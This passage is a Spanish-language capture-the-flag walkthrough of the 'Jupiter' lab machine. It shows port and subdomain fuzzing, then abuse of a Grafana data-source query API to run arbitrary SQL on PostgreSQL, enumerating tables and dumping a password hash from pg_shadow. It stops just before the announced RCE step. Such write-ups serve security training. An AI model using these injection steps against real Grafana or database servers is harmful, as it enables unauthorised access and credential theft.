@@ -1,0 +1,618 @@
+I"��<p>Descubriremos un subdomino el cual hace uso de grafana y su API, para la intrusion haremos un SQLi a RCE usando un ruta de la API para realizar consultar, despues haremos movimiento lateral mediante un archivo YAML, despues otro movimiento lateral usando Jupyter el cual nos permitira ejecutar comando y mandarnos una rev shell, y para root abusaremos de un binario donde le indicaremos que descargue el archivo de la flag y lo guarde en un directorio dentro de /tmp</p>
+
+<h2 class="lead" id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap con:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sS -n -Pn -T4 --open -p- 10.10.11.216
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay dos puertos abiertos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,80 10.10.11.216
+</code></pre></div></div>
+<p>Vemos que por el puerto 80 nos dice que nos redirecciona a <strong>jupiter.htb</strong>, asi que debemos de agregar ese dominio al /etc/hosts</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">1</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
+</span><span class="o">|</span>   <span class="mi">256</span> <span class="n">ac</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="ss">:be</span><span class="p">:</span><span class="mi">79</span><span class="p">:</span><span class="mi">2</span><span class="n">d</span><span class="ss">:c9</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mo">00</span><span class="ss">:ed</span><span class="p">:</span><span class="mi">9</span><span class="n">a</span><span class="ss">:e6</span><span class="p">:</span><span class="mi">2</span><span class="n">b</span><span class="p">:</span><span class="mi">2</span><span class="n">d</span><span class="p">:</span><span class="mi">0</span><span class="n">e</span><span class="p">:</span><span class="mi">9</span><span class="n">b</span><span class="p">:</span><span class="mi">32</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">60</span><span class="p">:</span><span class="mo">01</span><span class="ss">:d7:db</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">7</span><span class="n">b</span><span class="p">:</span><span class="mi">13</span><span class="ss">:f0:ba</span><span class="p">:</span><span class="mi">20</span><span class="ss">:c6:c9</span><span class="p">:</span><span class="mo">00</span><span class="ss">:a7</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="mi">41</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Did</span> <span class="n">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">jupiter</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:linux:linux_kernel</span>
+</code></pre></div></div>
+<p>Al explorar la web principal no encontraremos nada que nos interese, asi que toca hacer fuzzing</p>
+
+<h3 id="fuzzing-de-subdominios">Fuzzing de subdominios</h3>
+
+<p>Si hacemos fuzzing de directorios para ver descubrir rutas:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'http://jupiter.htb/FUZZ'</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span>
+</code></pre></div></div>
+
+<p>Nos mostrara que existen varias rutas, pero ninguna es de interes, asi que probaremos con subdominios:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'http://jupiter.htb'</span> <span class="o">-</span><span class="no">H</span> <span class="s1">'Host: FUZZ.jupiter.htb'</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="o">--</span><span class="n">hh</span><span class="o">=</span><span class="mi">178</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">********************************************************</span>
+<span class="o">*</span> <span class="no">Wfuzz</span> <span class="mf">3.1</span><span class="o">.</span><span class="mi">0</span> <span class="o">-</span> <span class="no">The</span> <span class="no">Web</span> <span class="no">Fuzzer</span>                         <span class="o">*</span>
+<span class="o">********************************************************</span>
+
+<span class="no">Target</span><span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">jupiter</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span>
+<span class="no">Total</span> <span class="ss">requests: </span><span class="mi">220560</span>
+
+<span class="o">=====================================================================</span>
+<span class="no">ID</span>           <span class="no">Response</span>   <span class="no">Lines</span>    <span class="no">Word</span>       <span class="no">Chars</span>       <span class="no">Payload</span>                                                                                                 
+<span class="o">=====================================================================</span>
+
+<span class="mo">000000007</span><span class="p">:</span>   <span class="mi">400</span>        <span class="mi">7</span> <span class="no">L</span>      <span class="mi">12</span> <span class="no">W</span>       <span class="mi">166</span> <span class="no">Ch</span>      <span class="s2">"# license, visit http://creativecommons.org/licenses/by-sa/3.0/"</span>                                       
+<span class="mo">00000000</span><span class="mi">9</span><span class="p">:</span>   <span class="mi">400</span>        <span class="mi">7</span> <span class="no">L</span>      <span class="mi">12</span> <span class="no">W</span>       <span class="mi">166</span> <span class="no">Ch</span>      <span class="s2">"# Suite 300, San Francisco, California, 94105, USA."</span>                                                   
+<span class="mo">000013173</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">211</span> <span class="no">L</span>    <span class="mi">798</span> <span class="no">W</span>      <span class="mi">34390</span> <span class="no">Ch</span>    <span class="s2">"kiosk"</span>                                                                                                 
+<span class="mo">00016261</span><span class="mi">9</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">211</span> <span class="no">L</span>    <span class="mi">798</span> <span class="no">W</span>      <span class="mi">34390</span> <span class="no">Ch</span>    <span class="s2">"Kiosk"</span> 
+</code></pre></div></div>
+
+<p>Y logramos encontrar el de <strong>kiosk</strong>, asi que tambien lo agregamos al /etc/hosts</p>
+
+<h3 id="investigando-kioskjupiterhtb">Investigando kiosk.jupiter.htb</h3>
+
+<p>Cuando entramos a la web por primera vez vamos a poder ver que esta haciendo uso de grafana, incluso por unos segundos podemos ver en el <code class="language-plaintext highlighter-rouge">title</code> de la pagina que se esta usando grafana, basicamente grafana es un software para el analisis y monitoreo de datos metricos, grafana tambien dispone de una API, asi que es muy posible que se este usando para realizar cosas por detras, si entramos a la pagina web encontraremos un dashboard donde veremos la cantidad de lunas de los planetas</p>
+
+<p><img src="/assets/img/jupiter/1.png" alt="" /></p>
+
+<p>Si exploramos un poco, nos deremos cuenta que en cada seccion que contiene la informacion de los planetas y las lunas, se encuentra un pequeño menu, donde podemos encontrar mas informacion</p>
+
+<p><img src="/assets/img/jupiter/2.png" alt="" /></p>
+
+<p>Si le damos en inspeccionar y en panel JSON, podemos ver esto todo esto:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"datasource"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"YItSLg-Vz"</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"fieldConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"defaults"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"custom"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"align"</span><span class="p">:</span><span class="w"> </span><span class="s2">"auto"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"cellOptions"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+          </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"auto"</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="nl">"inspect"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+      </span><span class="p">},</span><span class="w">
+      </span><span class="nl">"mappings"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
+      </span><span class="nl">"thresholds"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"absolute"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"steps"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+          </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"color"</span><span class="p">:</span><span class="w"> </span><span class="s2">"green"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
+          </span><span class="p">},</span><span class="w">
+          </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"color"</span><span class="p">:</span><span class="w"> </span><span class="s2">"red"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span><span class="w">
+          </span><span class="p">}</span><span class="w">
+        </span><span class="p">]</span><span class="w">
+      </span><span class="p">},</span><span class="w">
+      </span><span class="nl">"color"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"thresholds"</span><span class="w">
+      </span><span class="p">}</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="nl">"overrides"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"gridPos"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"h"</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"w"</span><span class="p">:</span><span class="w"> </span><span class="mi">12</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"x"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"y"</span><span class="p">:</span><span class="w"> </span><span class="mi">15</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">24</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"options"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"showHeader"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"cellHeight"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sm"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"footer"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"show"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"reducer"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="s2">"sum"</span><span class="w">
+      </span><span class="p">],</span><span class="w">
+      </span><span class="nl">"countRows"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"fields"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"enablePagination"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"pluginVersion"</span><span class="p">:</span><span class="w"> </span><span class="s2">"9.5.2"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"targets"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"datasource"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"YItSLg-Vz"</span><span class="w">
+      </span><span class="p">},</span><span class="w">
+      </span><span class="nl">"editorMode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"code"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"format"</span><span class="p">:</span><span class="w"> </span><span class="s2">"table"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"hide"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"rawQuery"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"rawSql"</span><span class="p">:</span><span class="w"> </span><span class="s2">"select </span><span class="se">\n</span><span class="s2">  name as </span><span class="se">\"</span><span class="s2">Name</span><span class="se">\"</span><span class="s2">, </span><span class="se">\n</span><span class="s2">  parent as </span><span class="se">\"</span><span class="s2">Parent Planet</span><span class="se">\"</span><span class="s2">, </span><span class="se">\n</span><span class="s2">  meaning as </span><span class="se">\"</span><span class="s2">Name Meaning</span><span class="se">\"</span><span class="s2"> </span><span class="se">\n</span><span class="s2">from </span><span class="se">\n</span><span class="s2">  moons </span><span class="se">\n</span><span class="s2">where </span><span class="se">\n</span><span class="s2">  parent = 'Saturn' </span><span class="se">\n</span><span class="s2">order by </span><span class="se">\n</span><span class="s2">  name desc;"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"refId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"A"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"sql"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"columns"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+          </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"function"</span><span class="w">
+          </span><span class="p">}</span><span class="w">
+        </span><span class="p">],</span><span class="w">
+        </span><span class="nl">"groupBy"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+          </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"property"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+              </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"string"</span><span class="w">
+            </span><span class="p">},</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"groupBy"</span><span class="w">
+          </span><span class="p">}</span><span class="w">
+        </span><span class="p">],</span><span class="w">
+        </span><span class="nl">"limit"</span><span class="p">:</span><span class="w"> </span><span class="mi">50</span><span class="w">
+      </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Moons of Planet Saturn"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"transparent"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"table"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Podemos ver que como base de datos se esta usando <strong>postgreSQL</strong> y eso nos los dice en:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"datasource"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"YItSLg-Vz"</span><span class="w">
+      </span><span class="p">}</span><span class="err">,</span><span class="w">
+</span></code></pre></div></div>
+<p>(si quieres investigar un poco mas de esto puedes ver la documentacion: <a href="https://grafana.com/docs/grafana/latest/datasources/postgres/">aqui</a>)</p>
+
+<p>Y abajo podemos ver la consulta que se esta realizando:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"rawSql"</span><span class="p">:</span><span class="w"> </span><span class="s2">"select </span><span class="se">\n</span><span class="s2">  name as </span><span class="se">\"</span><span class="s2">Name</span><span class="se">\"</span><span class="s2">, </span><span class="se">\n</span><span class="s2">  parent as </span><span class="se">\"</span><span class="s2">Parent Planet</span><span class="se">\"</span><span class="s2">, </span><span class="se">\n</span><span class="s2">  meaning as </span><span class="se">\"</span><span class="s2">Name Meaning</span><span class="se">\"</span><span class="s2"> </span><span class="se">\n</span><span class="s2">from </span><span class="se">\n</span><span class="s2">  moons </span><span class="se">\n</span><span class="s2">where </span><span class="se">\n</span><span class="s2">  parent = 'Saturn' </span><span class="se">\n</span><span class="s2">order by </span><span class="se">\n</span><span class="s2">  name desc;"</span><span class="err">,</span><span class="w">
+</span></code></pre></div></div>
+<p>Hasta ahora tenemos que usa grafana, postgreSQL, y que se hacen consultas a una base de datos para obtener la informacion de las lunas de los planetas.</p>
+
+<p>Hace un momento habia mencionado que grafana tiene una API, pues esta es la <a href="https://grafana.com/docs/grafana/latest/developers/http_api/data_source/">Data source API</a>, vi vemos un poco la documentacion nos dice que si hacemos una peticion a <strong>GET /api/datasources</strong> obtendremos informacion de todas las fuentes de datos:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
+  </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"YItSLg-Vz"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"orgId"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PostgreSQL"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"typeName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PostgreSQL"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"typeLogoUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"public/app/plugins/datasource/postgres/img/postgresql_logo.svg"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"access"</span><span class="p">:</span><span class="w"> </span><span class="s2">"proxy"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"localhost:5432"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"grafana_viewer"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"database"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"basicAuth"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"isDefault"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"jsonData"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"database"</span><span class="p">:</span><span class="w"> </span><span class="s2">"moon_namesdb"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"sslmode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"disable"</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="nl">"readOnly"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Y ahora confirmamos que la base de datos es una PostgreSQL como lo dice en <strong>“name”: “PostgreSQL”</strong>, ademas de que la base de datos es <strong>moon_namesdb</strong> como lo dice en <strong>database”: “moon_namesdb”</strong>, ahora debemos de encontrar la forma de realizar consultar a la base de datos para ver si existen un posible SQLi, si seguimos viendo la documentacion de la API, encontraremos que a tra vez de la ruta <strong>/api/ds/query</strong> podemos realizar peticiones por POST y realizar consultas a la base da datos.</p>
+
+<p>Si intentamos acceder mediante la URL: <strong>http://kiosk.jupiter.htb/api/ds/query</strong>, no vamos a poder, afortunadamente BurpSuite en el apartado de proxy tiene una opcion la cual permite ver todo el historial HTTP, vean que si nos regresamos al dashboard y le damos en inspeccionar en panel JSON, tenemos que en el historial HTTP se esta accediendo a <strong>/api/ds/query</strong>:</p>
+
+<p><img src="/assets/img/jupiter/3.png" alt="" /></p>
+
+<p>Si mandamos esto al repeater, podemos ver la consulta que se esta haciendo</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">"rawSql"</span><span class="p">:</span><span class="nv">"select </span><span class="se">\n</span><span class="nv">  count(parent) </span><span class="se">\n</span><span class="nv">from </span><span class="se">\n</span><span class="nv">  moons </span><span class="se">\n</span><span class="nv">where </span><span class="se">\n</span><span class="nv">  parent = 'Jupiter';"</span><span class="p">,</span>
+</code></pre></div></div>
+
+<p>Asi que toca probar SQLi</p>
+
+<h2 id="sql-injection">SQL injection</h2>
+
+<p>Si mostramos el nombre de la base de datos:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">current_database</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Podemos ver que nos reporta la base de datos que esta en uso:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"data"</span><span class="p">:{</span><span class="w">
+    </span><span class="nl">"values"</span><span class="p">:[</span><span class="w">
+        </span><span class="p">[</span><span class="w">
+            </span><span class="s2">"moon_namesdb"</span><span class="w">
+        </span><span class="p">]</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p><strong>Ojo:</strong> Ahora empezare a enumerar la base de datos haciedo uso de <strong>pg_catalog</strong> la cual es similar a <strong>information_schema</strong>, ya que esta contiene informacion de las bases de datos, esto no es necesario ya que no encontraremos nada que nos sirva, solo lo hago por que se me hace interesante.</p>
+
+<h3 id="enumeracion-de-la-db">Enumeracion de la DB</h3>
+
+<p>Como sabemos que se esta haciendo uso de <strong>postgreSQL</strong> podemos usar <strong>pg_catalog</strong> para enumerar la base de datos, usando <strong>SELECT * FROM pg_catalog.pg_database;</strong> mostraremos todas las base de datos existentes, con <strong>pg_catalog.pg_database</strong> le estamos diciendo que de <strong>pg_catalog</strong> muestre las bases de datos, y eso lo indicamos con <strong>pg_database</strong>, el resultado son todas las bases de datos existentes</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
+    </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"moon_namesdb"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"template1"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"template0"</span><span class="w">
+</span><span class="p">]</span><span class="err">,</span><span class="w">
+</span></code></pre></div></div>
+<p>Vemos que la base de datos que nos interesa es la <strong>moon_namesdb</strong>, asi que ahora empezaremos a enumerar las tablas de esta base da datos, ten en cuenta que no es necesario usar un <strong>WHERE</strong> para indicarle la base datos que queremos enumerar por que <strong>moon_namesdb</strong> ya esta en uso, asi que las consultas se harian usando esa base de datos, usando de</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT tablename FROM pg_catalog.pg_tables;
+</code></pre></div></div>
+
+<p>Obtendremos todas las tablas, en este caso le indicamos con el SELECT que obtenga la columna llamada <code class="language-plaintext highlighter-rouge">tablename</code> de <code class="language-plaintext highlighter-rouge">pg_tables</code> la cual tiene todas las tablas de la base de datos <code class="language-plaintext highlighter-rouge">moon_namesdb</code>, podemos observar dos tablas interesantes: <code class="language-plaintext highlighter-rouge">pg_user_mapping</code> y <code class="language-plaintext highlighter-rouge">pg_shadow</code>, si mostramos todos los datos usando <code class="language-plaintext highlighter-rouge">SELECT * FROM pg_shadow</code> nos mostrara eso:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"values"</span><span class="p">:[</span><span class="w">
+    </span><span class="p">[</span><span class="w">
+        </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"grafana_viewer"</span><span class="w">
+    </span><span class="p">],</span><span class="w">
+    </span><span class="p">[</span><span class="w">
+        </span><span class="s2">"10"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"16385"</span><span class="w">
+    </span><span class="p">],</span><span class="w">
+    </span><span class="p">[</span><span class="w">
+        </span><span class="kc">null</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY="</span><span class="w">
+    </span><span class="p">],</span><span class="w">
+</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Parace ser el hash de una contraseña, que no podemos crackear, y si mostramos los datos de <code class="language-plaintext highlighter-rouge">pg_user_mapping</code> no saldra nada, asi que es posible que debamos de hacer otra cosa, intentaremos realizar un RCE para mandarnos una reverse shell, guiandonos de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution">aqui</a> usaremos este consulta para conseguir RCE:</p>
+
